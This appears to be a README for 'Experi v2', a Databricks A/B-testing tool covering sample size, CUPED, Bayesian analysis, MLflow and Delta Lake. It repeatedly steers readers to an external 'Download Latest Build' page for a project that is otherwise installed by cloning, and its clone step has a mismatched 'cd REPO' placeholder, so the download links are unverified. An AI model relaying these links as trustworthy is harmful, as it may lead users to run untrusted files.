# Experi v2 - A/B Experiment Design Tool 2026

> **Experi is a Python-powered Databricks tool for designing, evaluating, and monitoring A/B tests. Version 2 combines sample-size calculations, runtime projections, CUPED, and Bayesian analysis in one workflow.**

[![Platform](https://img.shields.io/badge/Platform-Databricks-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/zackcarterql768/experi-cuped-bayesian-v2?style=flat-square)](https://github.com/zackcarterql768/experi-cuped-bayesian-v2)

---

<p align="center">
  <a href="https://zackcarterql768.github.io/experi-cuped-bayesian-v2/">
    <img src="https://img.shields.io/badge/Download-Experi%20Latest-brightgreen?style=for-the-badge" alt="Download Experi">
  </a>
</p>

> **[Download Experi v2](https://zackcarterql768.github.io/experi-cuped-bayesian-v2/)**

---

[Download Latest Build](https://zackcarterql768.github.io/experi-cuped-bayesian-v2/)

---

## Overview

Experi helps startup product managers and Databricks-based teams plan A/B tests before collecting data. Starting with an experiment concept, it produces a practical plan that includes the required sample size and an estimate of how long the test may need to run.

Its workflow combines statistical planning, Bayesian probability evaluation, CUPED-based variance reduction, and posterior charts. MLflow records experiment definitions and versions, while Delta Lake retains results, lineage information, and audit history in a persistent store.

---

## What Experi Provides

- Determine the participant count required for an A/B test.
- Project the expected duration of an experiment from its planning inputs.
- Use CUPED to reduce variance and make analysis more efficient.
- Evaluate experiment results using Bayesian inference.
- Display posterior distributions for the observed outcomes.
- Track experiment definitions and revisions through MLflow.
- Save experiment results to Delta Lake.
- Support repeatable processing with lineage and audit records.

---

## Installation

First clone the repository from an environment that can connect to Databricks:

```bash
git clone https://github.com/zackcarterql768/experi-cuped-bayesian-v2.git
cd REPO
```

Install the dependencies specified by the project, then launch the application or notebook entry point within Databricks. When the checkout is configured as a Gradio application, use the supplied launch file or notebook cell to start its interface.

For a standard Python installation, the dependency command is:

```bash
python -m pip install -r requirements.txt
```

Before running an experiment, apply the workspace, cluster, and storage configuration required by your organization.

---

## Working with Experi

A normal experiment cycle looks like this:

1. Launch Experi from a Databricks workspace.
2. Specify the control group, treatment group, and metric to evaluate.
3. Work out the sample-size requirement and projected runtime.
4. Enable CUPED if appropriate covariates are available.
5. Perform the analysis and examine the Bayesian probabilities.
6. Explore the posterior distribution visualizations.
7. Record the experiment and its version in MLflow.
8. Write the resulting data to Delta Lake for future inspection and auditing.

When the deployment enables it, the Gradio interface provides an interactive way to run the workflow. For scheduled or repeatable execution, run the Python pipeline from a Databricks notebook or job.

---

## Configuration

Experi can be configured through the project settings, notebook arguments, or environment-specific Databricks values. Keep data-source settings, Delta Lake locations, MLflow experiment paths, and statistical parameters outside the main pipeline where possible.

A representative configuration may look like this:

```yaml
experiment_name: homepage_test
control_group: control
treatment_group: treatment
metric: conversion_rate
enable_cuped: true
mlflow_experiment: /experiments/homepage_test
delta_table: analytics.experi_results
```

The exact names and values should be aligned with the configuration interface provided in your checkout.

---

## Requirements

- Access to a Databricks workspace.
- A supported Python runtime.
- Permission to read the datasets required for experiment analysis.
- Delta Lake storage for retaining outputs.
- MLflow access for logging experiments and tracking versions.
- A Databricks cluster or job environment that can run the project's Python dependencies.
- Gradio support for deployments that use the interactive interface.

Choose storage, permissions, and runtime capacity based on the amount of experiment data and the requirements of the Databricks workspace.

---

## Frequently Asked Questions

### What teams use Experi?

Experi is intended for startup product managers and Databricks teams that design or assess A/B experiments.

### Where can I obtain the current release?

Select [Download Latest Build](https://zackcarterql768.github.io/experi-cuped-bayesian-v2/) above, or clone the repository and check out the release version appropriate for your workspace.

### How are results retained?

Experiment outputs are intended to be stored in Delta Lake. The destination is controlled through the project configuration or Databricks parameters.

### Is experiment history tracked?

Yes. Experi uses MLflow logging and versioning to maintain records of experiment definitions and analysis runs.

### Can the analysis method be adjusted?

Experi supports sample-size planning, CUPED variance reduction, and Bayesian probability analysis. The available options can be selected according to the project settings and the design of the experiment.

### What can I verify when startup fails?

Check that the required Python packages are installed, the Databricks cluster is active, and the necessary data permissions are available. Also verify MLflow and Delta Lake access, then inspect the notebook or application output for the initialization error.

---

## Planned Improvements

- Make experiment planning and runtime projections more efficient.
- Add more reusable analysis configurations for Databricks jobs.
- Provide clearer access to MLflow entries and Delta Lake result history.
- Broaden reporting for posterior distributions and experiment lineage.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
